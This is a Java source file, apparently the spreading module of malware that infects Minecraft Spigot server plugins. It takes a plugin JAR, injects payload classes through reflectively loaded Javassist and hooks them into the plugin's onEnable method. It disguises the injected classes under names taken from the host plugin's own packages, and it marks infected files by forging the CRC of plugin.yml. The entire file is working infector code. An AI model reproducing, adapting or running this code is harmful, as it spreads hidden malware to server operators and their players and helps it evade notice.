package com.tmquan2508.exploit;

import org.apache.commons.lang3.SystemUtils;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.net.JarURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class Spread {

    private record InjectionPlan(String newPackage, String newPrefix) {}

    private static class CrcPatcher {
        private static final int EOCD_SIGNATURE = 0x06054b50;
        private static final int CENTRAL_DIR_SIGNATURE = 0x02014b50;
        private static final String FAKE_STRING = "openbd.injected";

        public static void markJarWithFakeCRC(File jarFile) throws IOException {
            byte[] bytes = Files.readAllBytes(jarFile.toPath());
            int eocdOffset = findEOCDOffset(bytes);
            if (eocdOffset == -1) {
                throw new IOException("EOCD not found in " + jarFile.getName());
            }

            int centralDirectoryOffset = getIntLE(bytes, eocdOffset + 16);
            int currentOffset = centralDirectoryOffset;

            while (getIntLE(bytes, currentOffset) == CENTRAL_DIR_SIGNATURE) {
                int fileNameLength = getShortLE(bytes, currentOffset + 28);
                int extraFieldLength = getShortLE(bytes, currentOffset + 30);
                int fileCommentLength = getShortLE(bytes, currentOffset + 32);
                String filename = new String(bytes, currentOffset + 46, fileNameLength, StandardCharsets.UTF_8);

                if ("plugin.yml".equals(filename)) {
                    int crcOffset = currentOffset + 16;
                    long fakeCRC = calculateFakeCRC();
                    putIntLE(bytes, crcOffset, (int) fakeCRC);
                    Files.write(jarFile.toPath(), bytes, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
                    return;
                }
                currentOffset += 46 + fileNameLength + extraFieldLength + fileCommentLength;
            }

            throw new IOException("plugin.yml not found in central directory of " + jarFile.getName());
        }

        public static long calculateFakeCRC() {
            CRC32 crc = new CRC32();
            crc.update(FAKE_STRING.getBytes(StandardCharsets.UTF_8));
            return crc.getValue();
        }

        private static int findEOCDOffset(byte[] bytes) {
            for (int i = bytes.length - 22; i >= Math.max(0, bytes.length - 65557); i--) {
                if (getIntLE(bytes, i) == EOCD_SIGNATURE) {
                    return i;
                }
            }
            return -1;
        }

        private static int getIntLE(byte[] b, int off) {
            return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8) | ((b[off + 2] & 0xFF) << 16) | ((b[off + 3] & 0xFF) << 24);
        }

        private static void putIntLE(byte[] b, int off, int val) {
            b[off] = (byte) (val & 0xFF);
            b[off + 1] = (byte) ((val >> 8) & 0xFF);
            b[off + 2] = (byte) ((val >> 16) & 0xFF);
            b[off + 3] = (byte) ((val >> 24) & 0xFF);
        }

        private static int getShortLE(byte[] b, int off) {
            return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8);
        }
    }

    private static class CamouflageUtils {
        public record CamouflagePlan(String packageName, String namePrefix) {}

        private static final Random RANDOM = new Random();
        private static final Pattern CAMEL_CASE_SPLIT_PATTERN = Pattern.compile("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])");

        public static CamouflagePlan generateCamouflagePlan(File targetJarFile) {
            logMessage("[Camouflage] Analyzing JAR file to generate camouflage plan...");
            Map<String, List<String>> packageStructure = scanJarForPackageStructure(targetJarFile);
            if (packageStructure.isEmpty()) {
                logMessage("[Camouflage] WARNING: Target JAR contains no class files. Using fallback camouflage.");
                return new CamouflagePlan("com/tmquan2508/internal/safe", "InternalTask");
            }
            List<Map.Entry<String, List<String>>> packagesSortedByClassCount = packageStructure.entrySet().stream()
                .filter(entry -> entry.getKey() != null && !entry.getKey().isEmpty() && !entry.getKey().startsWith("META-INF"))
                .sorted((e1, e2) -> Integer.compare(e2.getValue().size(), e1.getValue().size()))
                .collect(Collectors.toList());
            if (packagesSortedByClassCount.isEmpty()) {
                throw new IllegalStateException("Cannot generate camouflage plan: No suitable packages found in target JAR.");
            }
            Map.Entry<String, List<String>> chosenEntry = packagesSortedByClassCount.get(RANDOM.nextInt(Math.min(4, packagesSortedByClassCount.size())));
            String chosenPackagePath = chosenEntry.getKey();
            List<String> classNamesInPackage = chosenEntry.getValue();
            logMessage("[Camouflage] Selected package for camouflage: '" + chosenPackagePath + "'");
            List<String> dictionary = buildWordDictionaryFrom(classNamesInPackage);
            if (dictionary.isEmpty()) {
                logMessage("[Camouflage] WARNING: Could not build a word dictionary. Using fallback prefix 'Task'.");
                return new CamouflagePlan(chosenPackagePath, "Task");
            }
            logMessage("[Camouflage] Built a dictionary with " + dictionary.size() + " words.");
            String namePrefix = buildUniqueWordName(dictionary, classNamesInPackage.stream().map(s -> s.substring(0, s.lastIndexOf('.'))).collect(Collectors.toList()), 1, 2);
            logMessage("[Camouflage] Generated camouflage name prefix: '" + namePrefix + "'");
            return new CamouflagePlan(chosenPackagePath, namePrefix);
        }

        private static List<String> buildWordDictionaryFrom(List<String> classNames) {
            return classNames.stream()
                .map(className -> className.substring(0, className.lastIndexOf('.')))
                .flatMap(className -> Arrays.stream(CAMEL_CASE_SPLIT_PATTERN.split(className)))
                .map(word -> word.replaceAll("[^a-zA-Z0-9]", ""))
                .filter(word -> word.length() > 2)
                .distinct()
                .collect(Collectors.toList());
        }

        private static String buildUniqueWordName(List<String> dictionary, List<String> existingNames, int minWords, int maxWords) {
            String name;
            int attempts = 0;
            do {
                int wordCount = minWords + RANDOM.nextInt(maxWords - minWords + 1);
                StringBuilder nameBuilder = new StringBuilder();
                for (int i = 0; i < wordCount; i++) {
                    nameBuilder.append(dictionary.get(RANDOM.nextInt(dictionary.size())));
                }
                name = nameBuilder.toString();
                if (attempts > 10) {
                    name += attempts;
                }
                attempts++;
            } while (existingNames.contains(name));
            return name;
        }

        private static Map<String, List<String>> scanJarForPackageStructure(File jarFile) {
            Map<String, List<String>> packageMap = new HashMap<>();
            try (ZipFile zipFile = new ZipFile(jarFile)) {
                Enumeration<? extends ZipEntry> entries = zipFile.entries();
                while (entries.hasMoreElements()) {
                    ZipEntry entry = entries.nextElement();
                    if (entry.isDirectory() || !entry.getName().endsWith(".class") || entry.getName().contains("package-info.class"))
                        continue;
                    String fullPath = entry.getName();
                    int lastSlash = fullPath.lastIndexOf('/');
                    String packageName = (lastSlash == -1) ? "" : fullPath.substring(0, lastSlash);
                    packageMap.computeIfAbsent(packageName, k -> new ArrayList<>()).add(fullPath.substring(lastSlash + 1));
                }
            } catch (IOException e) {
                logMessage("[Camouflage] Error scanning JAR file: " + stackTrace(e));
            }
            return packageMap;
        }
    }

    private static class AdvancedDynamicInvoker {
        public static <T> T invokeConstructor(Class<T> targetClass, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType constructorType = MethodType.methodType(void.class, paramTypes);
                MethodHandle handle = lookup.findConstructor(targetClass, constructorType);
                return (T) handle.invokeWithArguments(args);
            } catch (Throwable t) {
                logMessage("[DynamicInvoker] CRITICAL: Failed to invoke constructor for '" + targetClass.getName() + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeStaticMethod(Class<?> targetClass, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findStatic(targetClass, methodName, methodType);
                return handle.invokeWithArguments(args);
            } catch (Throwable t) {
                logMessage("[DynamicInvoker] CRITICAL: Failed to invoke static method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeInstanceMethod(Object target, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findVirtual(target.getClass(), methodName, methodType);
                return handle.bindTo(target).invokeWithArguments(args);
            } catch (Throwable t) {
                logMessage("[DynamicInvoker] CRITICAL: Failed to invoke instance method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        private static String stackTrace(Throwable e) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            e.printStackTrace(pw);
            return sw.toString();
        }
    }

    private static class JavassistReflectiveWrapper {
        final MethodHandle mhCreateClassMap;
        final MethodHandle mhGetDefaultPool;
        final MethodHandle mhPoolGet;
        final MethodHandle mhPoolMakeClass;
        final MethodHandle mhAppendClassPath;
        final MethodHandle mhReplaceClassName;
        final MethodHandle mhToBytecode;
        final MethodHandle mhGetName;
        final MethodHandle mhGetDeclaredMethod;
        final MethodHandle mhDetach;
        final MethodHandle mhInsertAfter;

        public JavassistReflectiveWrapper(MethodHandle... handles) {
            this.mhCreateClassMap = handles[0];
            this.mhGetDefaultPool = handles[1];
            this.mhPoolGet = handles[2];
            this.mhPoolMakeClass = handles[3];
            this.mhAppendClassPath = handles[4];
            this.mhReplaceClassName = handles[5];
            this.mhToBytecode = handles[6];
            this.mhGetName = handles[7];
            this.mhGetDeclaredMethod = handles[8];
            this.mhDetach = handles[9];
            this.mhInsertAfter = handles[10];
        }

        public Object createClassMap() throws Throwable { return mhCreateClassMap.invoke(); }
        public Object createDefaultClassPool() throws Throwable { return mhGetDefaultPool.invoke(); }
        public Object getClassFromPool(Object classPool, String className) throws Throwable { return mhPoolGet.invoke(classPool, className); }
        public Object makeClass(Object classPool, InputStream is) throws Throwable { return mhPoolMakeClass.invoke(classPool, is); }
        public void appendClassPath(Object classPool, String path) throws Throwable { mhAppendClassPath.invoke(classPool, path); }
        public void replaceClassName(Object ctClass, Object classMap) throws Throwable { mhReplaceClassName.invoke(ctClass, classMap); }
        public byte[] toBytecode(Object ctClass) throws Throwable { return (byte[]) mhToBytecode.invoke(ctClass); }
        public String getName(Object ctClass) throws Throwable { return (String) mhGetName.invoke(ctClass); }
        public Object getDeclaredMethod(Object ctClass, String methodName) throws Throwable { return mhGetDeclaredMethod.invoke(ctClass, methodName); }
        public void detach(Object ctClass) throws Throwable { mhDetach.invoke(ctClass); }
        public void insertAfter(Object ctMethod, String code) throws Throwable { mhInsertAfter.invoke(ctMethod, code); }
    }

    private static JavassistReflectiveWrapper createStealthyJavassistWrapper() throws Exception {
        logMessage("[Loader] Creating stealthy Javassist wrapper...");
        logMessage("[Loader] Step 1: Dynamically creating URLClassLoader...");
        String javassistUrlStr = "https://repo1.maven.org/maven2/org/javassist/javassist/3.29.0-GA/javassist-3.29.0-GA.jar";
        URL javassistUrl = AdvancedDynamicInvoker.invokeConstructor(URL.class, new Class<?>[]{String.class}, javassistUrlStr);
        if (javassistUrl == null) throw new IOException("Failed to create Javassist URL");

        URL[] urls = new URL[]{javassistUrl};
        URLClassLoader javassistClassLoader = AdvancedDynamicInvoker.invokeConstructor(URLClassLoader.class, new Class<?>[]{URL[].class}, (Object) urls);
        if (javassistClassLoader == null) throw new IOException("Failed to create URLClassLoader for Javassist");
        logMessage("[Loader] URLClassLoader created successfully.");

        logMessage("[Loader] Step 2: Dynamically loading Javassist classes...");
        Class<?> classPoolClass = (Class<?>) AdvancedDynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.ClassPool");
        Class<?> ctClassClass = (Class<?>) AdvancedDynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.CtClass");
        Class<?> ctMethodClass = (Class<?>) AdvancedDynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.CtMethod");
        Class<?> classMapClass = (Class<?>) AdvancedDynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.ClassMap");
        Class<?> classPathClass = (Class<?>) AdvancedDynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.ClassPath");

        if (classPoolClass == null || ctClassClass == null || ctMethodClass == null || classMapClass == null || classPathClass == null) {
            throw new ClassNotFoundException("Failed to load one or more Javassist core classes.");
        }
        logMessage("[Loader] Core classes loaded.");

        logMessage("[Loader] Step 3: Dynamically finding all required MethodHandles...");
        MethodHandles.Lookup lookup = MethodHandles.lookup();
        MethodHandle mhCreateClassMap = lookup.findConstructor(classMapClass, MethodType.methodType(void.class));
        MethodHandle mhGetDefaultPool = lookup.findStatic(classPoolClass, "getDefault", MethodType.methodType(classPoolClass));
        MethodHandle mhPoolGet = lookup.findVirtual(classPoolClass, "get", MethodType.methodType(ctClassClass, String.class));
        MethodHandle mhPoolMakeClass = lookup.findVirtual(classPoolClass, "makeClass", MethodType.methodType(ctClassClass, InputStream.class));
        MethodHandle mhAppendClassPath = lookup.findVirtual(classPoolClass, "appendClassPath", MethodType.methodType(classPathClass, String.class));
        MethodHandle mhReplaceClassName = lookup.findVirtual(ctClassClass, "replaceClassName", MethodType.methodType(void.class, classMapClass));
        MethodHandle mhToBytecode = lookup.findVirtual(ctClassClass, "toBytecode", MethodType.methodType(byte[].class));
        MethodHandle mhGetName = lookup.findVirtual(ctClassClass, "getName", MethodType.methodType(String.class));
        MethodHandle mhGetDeclaredMethod = lookup.findVirtual(ctClassClass, "getDeclaredMethod", MethodType.methodType(ctMethodClass, String.class));
        MethodHandle mhDetach = lookup.findVirtual(ctClassClass, "detach", MethodType.methodType(void.class));
        MethodHandle mhInsertAfter = lookup.findVirtual(ctMethodClass, "insertAfter", MethodType.methodType(void.class, String.class));
        logMessage("[Loader] All MethodHandles found.");

        logMessage("[Loader] Stealthy wrapper construction complete.");
        return new JavassistReflectiveWrapper(mhCreateClassMap, mhGetDefaultPool, mhPoolGet, mhPoolMakeClass, mhAppendClassPath, mhReplaceClassName, mhToBytecode, mhGetName, mhGetDeclaredMethod, mhDetach, mhInsertAfter);
    }

    private static void logMessage(String message) {
        Exploit.sendDebug(message);
    }

    private static String stackTrace(Exception e) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        e.printStackTrace(pw);
        return sw.toString();
    }

    private static List<String> getClassesToInject() throws IOException {
        String payloadBase64 = Config.class_list;
        if (payloadBase64 == null || payloadBase64.isEmpty() || payloadBase64.startsWith("::")) {
            throw new IOException("CRITICAL: Payload in Config.class_list is missing or not replaced by build process.");
        }
        byte[] payloadBytes = Base64.getDecoder().decode(payloadBase64);
        List<String> classNames = new ArrayList<>();
        try (ByteArrayInputStream bais = new ByteArrayInputStream(payloadBytes);
             DataInputStream dis = new DataInputStream(bais)) {
            while (dis.available() > 0) {
                int length = dis.readInt();
                byte[] data = new byte[length];
                dis.readFully(data);
                classNames.add(new String(data, StandardCharsets.UTF_8));
            }
        }
        if (classNames.isEmpty()) {
            throw new IOException("CRITICAL: Decoded payload is empty or corrupted.");
        }
        logMessage("[Spread] Successfully decoded " + classNames.size() + " classes from Config payload.");
        return classNames;
    }

    public static boolean patchFile(String orig, String out, boolean camouflage) {
        if (camouflage) {
            logMessage("[Spread] Camouflage mode is ENABLED.");
            return patchWithCamouflage(orig, out);
        } else {
            logMessage("[Spread] Camouflage mode is DISABLED. Using standard injection.");
            return patchStandard(orig, out);
        }
    }

    private static boolean patchWithCamouflage(String orig, String out) {
        File inputFile = new File(orig);
        if (!inputFile.exists()) return false;
        CamouflageUtils.CamouflagePlan plan = CamouflageUtils.generateCamouflagePlan(inputFile);
        InjectionPlan injectionPlan = new InjectionPlan(plan.packageName().replace('/', '.'), plan.namePrefix());
        logMessage("[Spread] New Camouflage Plan: Package='" + injectionPlan.newPackage() + "', Prefix='" + injectionPlan.newPrefix() + "'");
        return performPatching(orig, out, injectionPlan, "CAMOUFLAGE");
    }

    private static boolean patchStandard(String orig, String out) {
        InjectionPlan injectionPlan = new InjectionPlan("com.tmquan2508.exploit", "");
        logMessage("[Spread] Standard Injection Plan: Target Package='" + injectionPlan.newPackage() + "'");
        return performPatching(orig, out, injectionPlan, "STANDARD");
    }

    private static boolean isAlreadyPatched(Path jarPath) {
        try (ZipFile zipFile = new ZipFile(jarPath.toFile())) {
            ZipEntry entry = zipFile.getEntry("plugin.yml");
            if (entry == null) {
                return false;
            }
            long storedCrc = entry.getCrc();
            long expectedCrc = CrcPatcher.calculateFakeCRC();
            return storedCrc == expectedCrc;
        } catch (IOException e) {
            logMessage("[Spread] Could not check for fake CRC marker: " + e.getMessage());
            return false;
        }
    }

    private static boolean performPatching(String orig, String out, InjectionPlan plan, String mode) {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);
        if (!Files.exists(input)) return false;

        try {
            if (isAlreadyPatched(input)) {
                logMessage("Plugin already patched (marker found). Skipping.");
                return false;
            }
            Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException e) {
            logMessage("Error during file prep or patch check: " + stackTrace(e));
            return false;
        }

        Map<String, Object> pluginYAML = readPluginYAML(output.toAbsolutePath().toString());
        if (pluginYAML == null) {
            logMessage("Not a valid Spigot plugin. Cleaning up.");
            try {
                Files.delete(output);
            } catch (IOException e) { /* ignore */ }
            return false;
        }
        String mainClass = (String) pluginYAML.get("main");

        try {
            try (FileSystem outStream = FileSystems.newFileSystem(output, (ClassLoader) null)) {
                JavassistReflectiveWrapper javassist = createStealthyJavassistWrapper();

                Object pool = javassist.createDefaultClassPool();
                String originalPackage = "com.tmquan2508.exploit";
                List<String> allEntries = getClassesToInject();
                Object relocationMapObj = javassist.createClassMap();
                @SuppressWarnings("unchecked")
                Map<String, String> relocationMap = (Map<String, String>) relocationMapObj;
                String finalExploitFQN = null;

                for (String entry : allEntries) {
                    String classPathNoExt = entry;
                    String fqnStylePath = classPathNoExt.replace('/', '.');
                    String sourceFQN = originalPackage + "." + fqnStylePath;
                    String destFQN = plan.newPackage() + "." + plan.newPrefix() + fqnStylePath;
                    if (entry.equals("Exploit")) {
                        finalExploitFQN = destFQN;
                    }
                    relocationMap.put(sourceFQN, destFQN);
                }
                if (finalExploitFQN == null) throw new IllegalStateException("Failed to determine the final FQN for Exploit class.");

                Collection<Object> allPayloadClasses = new ArrayList<>();
                ClassLoader classLoader = Spread.class.getClassLoader();
                for (Object sourceNameObj : relocationMap.keySet()) {
                    String sourceFQN = (String) sourceNameObj;
                    String resourcePath = sourceFQN.replace('.', '/') + ".class";
                    try (InputStream is = classLoader.getResourceAsStream(resourcePath)) {
                        if (is == null) throw new IOException("Cannot find payload resource: " + resourcePath);
                        allPayloadClasses.add(javassist.makeClass(pool, is));
                    }
                }

                for (Object cc : allPayloadClasses) javassist.replaceClassName(cc, relocationMapObj);
                for (Object cc : allPayloadClasses) {
                    String newFQN = javassist.getName(cc);
                    Path targetPath = outStream.getPath(newFQN.replace('.', '/') + ".class");
                    if (targetPath.getParent() != null) Files.createDirectories(targetPath.getParent());
                    Files.write(targetPath, javassist.toBytecode(cc));
                }

                logMessage("[Spread] Patching the main plugin class...");
                javassist.appendClassPath(pool, orig);
                Object ccMain = javassist.getClassFromPool(pool, mainClass);
                Object m = javassist.getDeclaredMethod(ccMain, "onEnable");
                String injectionCode = String.format("{ try { new %s((org.bukkit.plugin.Plugin)this); } catch (Throwable t) { t.printStackTrace(); } }", finalExploitFQN);
                javassist.insertAfter(m, injectionCode);
                Files.write(outStream.getPath(mainClass.replace('.', '/') + ".class"), javassist.toBytecode(ccMain), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
                javassist.detach(ccMain);
                for (Object cc : allPayloadClasses) javassist.detach(cc);
            }

            setInfectionMarkerOnTarget(output);
            logMessage("Successfully patched with " + mode + " injection: " + output.getFileName());

        } catch (Throwable e) {
            logMessage("A critical error occurred during " + mode + " patching process.\n" + stackTrace(new Exception(e)));
            try {
                Files.deleteIfExists(output);
            } catch (IOException ex) {
                logMessage("Error during cleanup: " + stackTrace(ex));
            }
            return false;
        }
        return true;
    }

    private static void setInfectionMarkerOnTarget(Path targetJarPath) throws IOException {
        logMessage("[Spread] Setting infection marker by faking plugin.yml CRC...");
        try {
            CrcPatcher.markJarWithFakeCRC(targetJarPath.toFile());
        } catch (Exception e) {
            throw new IOException("Failed to set fake marker on " + targetJarPath.getFileName(), e);
        }
    }

    private static Map<String, Object> readPluginYAML(String path) {
        Yaml yamlData = new Yaml();
        InputStream is = null;
        String inputFile = null;
        if (SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC) inputFile = "jar:file://" + path + "!/plugin.yml";
        if (SystemUtils.IS_OS_WINDOWS) inputFile = "jar:file:/" + path + "!/plugin.yml";
        try {
            if (inputFile != null) {
                URL url = AdvancedDynamicInvoker.invokeConstructor(URL.class, new Class<?>[]{String.class}, inputFile);
                if (url == null) return null;
                JarURLConnection connection = (JarURLConnection) url.openConnection();
                connection.setUseCaches(false);
                is = connection.getInputStream();
            }
        } catch (IOException e) {
            return null;
        }
        if (is == null) return null;
        try (InputStream finalIs = is) {
            return yamlData.load(finalIs);
        } catch (Exception e) {
            return null;
        }
    }
}